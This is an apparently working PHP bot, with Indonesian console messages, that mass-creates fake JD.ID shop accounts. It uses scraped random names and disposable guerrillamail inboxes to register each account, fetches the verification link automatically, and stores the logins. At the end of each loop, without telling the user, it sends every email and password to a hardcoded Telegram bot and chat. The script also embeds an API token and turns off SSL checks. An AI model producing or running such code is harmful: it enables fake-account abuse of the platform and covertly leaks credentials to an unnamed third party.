<?php error_reporting(0);
class Curl {
    function __construct()
    {
     
        $this->ch = curl_init();
    }
    public function get($url,$headers=false,$httpheader=false)
    {
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->ch, CURLOPT_HEADER, $headers);
        if($httpheader != false)
        {
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        $this->options();
        try
        {
            $this->objectResponse = curl_exec($this->ch);
            if($headers != false)
            {
                $header = substr($this->objectResponse, 0, curl_getinfo($this->ch, CURLINFO_HEADER_SIZE));
                $body = substr($this->objectResponse, curl_getinfo($this->ch, CURLINFO_HEADER_SIZE));
                return array($header,$body);
            } else {
                return $this->objectResponse;
            }
        } catch (Exception $e)
        {
            die("Exception: ".$e->getMessage()."");
        }
        $this->close();        
    }
    public function post($url,$body,$headers=false,$httpheader=false)
    {
        curl_setopt($this->ch, CURLOPT_URL, $url);
        curl_setopt($this->ch, CURLOPT_HEADER, $headers);
        curl_setopt($this->ch, CURLOPT_POST, true);
        curl_setopt($this->ch, CURLOPT_POSTFIELDS, $body);
        curl_setopt($this->ch, CURLOPT_TIMEOUT, 60);
        if($httpheader != false)
        {
            curl_setopt($this->ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        $this->options();
        try {
            $this->objectResponse = curl_exec($this->ch);
            if($headers != false)
            {
                $header = substr($this->objectResponse, 0, curl_getinfo($this->ch, CURLINFO_HEADER_SIZE));
                $body = substr($this->objectResponse, curl_getinfo($this->ch, CURLINFO_HEADER_SIZE));
                return array($header,$body);
            } else {
                return $this->objectResponse;
            }
        } catch(Exception $e)
        {
            die("Caught  Exception: ".$e->getMessage()."");
        }
        $this->close();
    }
    protected function close()
    {
        return curl_close($this->ch);
    }
    private function options()
    {
        curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, false);
        return $this->ch;
    }
    private function data()
	{
		$get = $this->get('https://fakenametool.net/random-name-generator/random/id_ID/indonesia/1',1);
	    preg_match('/<span>(.*?)<\/span>/', $get[1], $name);
	    if(isset($name[1]))
	    {
	    	$snama = explode(" ", strtolower($name[1]));
	    	$email = $snama[0].mt_rand(11111,99999)."@grr.la";
	    	return array('name' => $name[1], 'email' => $email);
	    } else {
	    	return false;
	    }
	}
	protected function headers()
	{
		$headers = array();
        $headers[] = 'Origin: https://passport.jd.id';
        $headers[] = 'Accept-Language: en-US,en;q=0.9';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Accept: application/json, text/plain, */*';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        $headers[] = 'Connection: keep-alive';

        return $headers;
	}
   public function register($password)
	{
		$data = $this->data();
		$body = 'ReturnUrl=ReturnUrl%3Dhttps%253A%252F%252Fm.jd.id%252Fuser%252Fmain%26_ga%3D2.152177849.1001472682.1553859131-1287252081.1553859131&spreadUserPin=&cpsPin=&phone=&email='.$data['email'].'&password=luna123&smsCode=&eid=&fp=&mode=EMail';
		$send = $this->post('https://passport.jd.id/register', $body,1, $this->headers());

		if(json_decode($send[1],1)['success'] == true)
		{
			$optToken = json_decode($send[1],1)['data']['optToken'];
			return $data['email'];
		} else {
			return false;
		}
	}
	public function verif($url)
	{
		$send = $this->get($url,1);
		if(preg_match('/registrasi berhasil!/', $send[1]))
		{
			return true;
		} 
		else if(preg_match('/melewati batas waktu/', $send[1])) 
		{
			return 'continue';
		} 
		else 
		{
			return false;
		}
	}
}
class jdClass
{
	function __construct()
	{
		
	}
	private function data()
	{
		$get = $this->curl('https://fakenametool.net/random-name-generator/random/id_ID/indonesia/1');
	    preg_match('/<span>(.*?)<\/span>/', $get[1], $name);
	    if(isset($name[1]))
	    {
	    	$snama = explode(" ", strtolower($name[1]));
	    	$email = $snama[0].mt_rand(11111,99999)."@grr.la";
	    	return array('name' => $name[1], 'email' => $email);
	    } else {
	    	return false;
	    }
	}
	public function register()
	{
		$data = $this->data();
		$body = 'ReturnUrl=ReturnUrl%3Dhttps%253A%252F%252Fm.jd.id%252Fuser%252Fmain%26_ga%3D2.152177849.1001472682.1553859131-1287252081.1553859131&spreadUserPin=&cpsPin=&phone=&email='.$data['email'].'&password=kangtahu123&smsCode=&eid=&fp=&mode=EMail';
		$send = $this->curl('https://passport.jd.id/register', $body, $this->headers());

		if(json_decode($send[1],1)['success'] == true)
		{
			$optToken = json_decode($send[1],1)['data']['optToken'];
			return $data['email'];
		} else {
			return false;
		}
	}
	public function getEmail($email)
    {
        $check = $this->curl('http://mailnesia.com/mailbox/'.$email);
        if(isset(json_decode($check[1],1)['msgs']))
        {
            $uid = json_decode($check[1],1)['msgs'][0]['uid'];
            $getMsg = $this->curl('http://mailnesia.com/mailbox/'.$uid);
            if(preg_match('/Joy/', json_decode($getMsg[1],1)['f']))
            {
                $getVerif = json_decode($getMsg[1],1)['html'] ? preg_match('/<span style="font-weight: bold"><a style="color:#333;" target="_blank" href="(.*?)"/', json_decode($getMsg[1],1)['html'], $verifUrl) : false;
                if($verifUrl[1] !== false)
                {
                    return $verifUrl[1];
                } else {
                    return false;
                }
            }
        }
    }
	public function cookies()
	{
		$cok = $this->curl('https://passport.jd.id/login?ReturnUrl=https://m.jd.id/user/main&_ga=2.92854101.999676485.1553857876-377239275.1545190939');
		preg_match_all('/Set-Cookie: (.*?);/', $cok[0], $cookies);
		preg_match("/'(.*?)':'(.*?)'/", $cok[1], $ada);
		$fill = $ada[1].'='.$ada[2];
		$cokz = '';
		foreach($cookies[1] as $cok)
		{
			$cokz .= $cok."; ";
		}
		return array($cokz, $fill);
	}
	public function login($email,$password)
	{
		$cok = $this->cookies();
		$body = 'ReturnUrl=https%253A%252F%252Fm.jd.id&publicM=&publicE=&publicUuid=&account='.$email.'&password='.$password.'&validateCode=&eid=SWVPDERF6MVSXGQTU6BV6D6DNI3EX4SUIKXNWZ7MUWNO626NXHSGTZWNLZO7RCETE6BKAQ23M7VRH43HBL237XZV6U&fp=&'.$cok[1];
		$head = $this->headers();
		$head[] = 'Cookie: '.$cok[0];
		$login = $this->curl('https://passport.jd.id/loginService', $body, $head);
		if(json_decode($login[1],1)['success'] == true)
		{
		   preg_match_all('/Set-Cookie: (.*?);/', $login[0], $cookies);
		   $cokz='';
		   foreach($cookies[1] as $cok)
		   {
			$cokz .= $cok."; ";
		   }
		   return array($cokz, 'ok');
		}else{
			return 'Error login';
		}
	}
	
	
	protected function headers()
	{
		$headers = array();
        $headers[] = 'Origin: https://passport.jd.id';
        $headers[] = 'Accept-Language: en-US,en;q=0.9';
        $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36';
        $headers[] = 'Content-Type: application/x-www-form-urlencoded';
        $headers[] = 'Accept: application/json, text/plain, */*';
        $headers[] = 'X-Requested-With: XMLHttpRequest';
        $headers[] = 'Connection: keep-alive';

        return $headers;
	}
	public function curl($url, $post=false, $httpheader=false)
	{
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if($post != false)
        {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if($httpheader != false)
        {
        	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
	    $response = curl_exec($ch);
	    $header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	    $body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
        curl_close($ch);
        return array($header, $body);
	}
}

function curl($url, $post=false, $httpheader=false)
	{
		$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        if($post != false)
        {
			$httpheader[] = "Content-Length: ".strlen($post);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        if($httpheader != false)
        {
        	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
	    $response = curl_exec($ch);
        curl_close($ch);
        return $response;
}


$class = new \Curl;
$jdClass = new \jdClass;
$passwordSettings = "luna123";
echo"=====================================================================\n";
echo"  Selamat Datang di Lalluna BOT JDID Account Creator - Auto Register \n";
echo"              Mari Pergunakan Bot ini Dengan Bijak                   \n";
echo"=====================================================================\n";
    		echo "Input Jumlah Akun Yang Akan di Register : ";
    		$jumlah = trim(fgets(STDIN));
            $i=1;
            $class = new \Curl;
    		while($i<$jumlah+1) {
    			   echo "Proses ke ".$i." dari ".$jumlah."\n";
    		        Register:
    		        echo "\n[1/5] Proses Register ke JD.ID\n";
    		        $registerJD = trim($class->register($passwordSettings));
					$email = str_replace("@grr.la","",$registerJD);
					$headers = array();
						$headers[] = "Host: www.guerrillamail.com";
						$headers[] = "Connection: close";
						$headers[] = "Origin: https://www.guerrillamail.com";
						$headers[] = "Authorization: ApiToken 567305d8e530343ed62745f7eb90ee4851cc3f70ae89190112a12ae128922195";
						$headers[] = "Content-Type: application/x-www-form-urlencoded; charset=UTF-8";						
						$headers[] = "Accept: application/json, text/javascript, */*; q=0.01";
						$headers[] = "Save-Data: on";
						$headers[] = "X-Requested-With: XMLHttpRequest";
						$headers[] = "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G935FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Safari/537.36";
						$headers[] = "Referer: https://www.guerrillamail.com/";
						$headers[] = "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
						$headers[] = "Cookie: PHPSESSID=ou5s2as0cejuoomgiq".rand(12345678,99999999);
					$gg = curl('https://www.guerrillamail.com/ajax.php?f=set_email_user', "email_user=$email&lang=en&site=guerrillamail.com&in=+Set+cancel", $headers);
					if($registerJD !== false)
    		        {
    		        	echo "[2/5] Register sukses email : ".trim($registerJD)."\n";
      		        	urlDapetin:
    		        	echo "[3/5] Mendapatkan Email Verifikasi...\n";
						$a = 1;
						while(true){
							echo "\r".$a++." Seconds";
							$check = @json_decode(curl('https://www.guerrillamail.com/ajax.php?f=get_email_list&offset=0&site=guerrillamail.com&in='.$email.'&_=1565625019954', false, $headers),true)['list'][0];
							if($check['mail_from']=="no-reply@jd.id")
							{
								break;
							} else {
								continue;
							}
						}
						$id = $check['mail_id'];
						$getMsg = @json_decode(curl('https://www.guerrillamail.com/ajax.php?f=fetch_email&email_id='.$id.'&site=guerrillamail.com&in='.$email.'&_=1565625019959', false, $headers),true);
						$getVerif = @explode('">',@explode('style="font-weight:bold;"><a href="',$getMsg['mail_body'])[1])[0];
						if(empty($getVerif))
						{
							$verifUrl = false;
						} else {
							$verifUrl = $getVerif;
						}
    		        	$urlToVerif = $verifUrl;
    		        	if($verifUrl !== false)
    		        	{    $class = new \Curl;
    				        echo "\r[4/5] Mencoba Verifikasi.. URL Verifikasi : ".$urlToVerif."\n";
							
    				        $goVerif = $class->verif(trim($urlToVerif));
    				        if($goVerif == true)
    				        {   
    				        	echo "[5/5] Verifikasi Berhasil. Akun Siap Digunakan...\n";
    				        	$localfile = "account-jdid.txt";
								$simpan = fopen($localfile, 'a');
								fwrite($simpan , $registerJD);
								fwrite($simpan , " | ");
								fwrite($simpan , $passwordSettings);
								fwrite($simpan , " | ");
                                $stringData = str_replace(".",".".PHP_EOL, $stringData);
								fwrite($simpan, $stringData); 							
								fclose($simpan );
    				        } else {
    				        	if($goVerif == 'continue')
    				        	{
    				        		echo "Ups! Verifikasi error. Kita ulangi dari awal saja ya!...\n";
    				        		continue;
    				        	} else {
    				             	echo "Ups! Verifikasi gagal... Kita ulangi dari awal saja ya...\n\n";
    				        	    goto Register;
    				        	}
    				        }
    			        } else {
    			        	echo "Ups! Gagal dapetin url untuk verifikasi. Tenang coba lagi ya.\n";
    			            goto urlDapetin;
    		         	}
    		          } else {
    		        	echo "Ups! Register Gagal. Tenang Kita Coba lagi ya.\n";
    			        goto Register;
    		         }
    		         $i++;
    		    echo "====Daftar Akun JDID yang telah Di Register====\n";
				echo "    Email   : $registerJD\n";
				echo "    Password: $passwordSettings\n";
				echo "    File Telah Disimpan di account-jdid.txt     \n";
				echo "===============================================\n";
				$ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot1063432526:AAFFGDMbONVgXddtMG-tj8SSOtCWQoymFwo/sendMessage?chat_id=-333545403&text=JDID-Account-Creator | " . $registerJD . " | Password : " . $passwordSettings );
										curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
										curl_exec($ch);
										curl_close ($ch);
    		  
    		    echo "======Terima Kasih Telah Menggunakan Laluna Bot Ini====\n";
    		  
    		 }
    	
     ?>
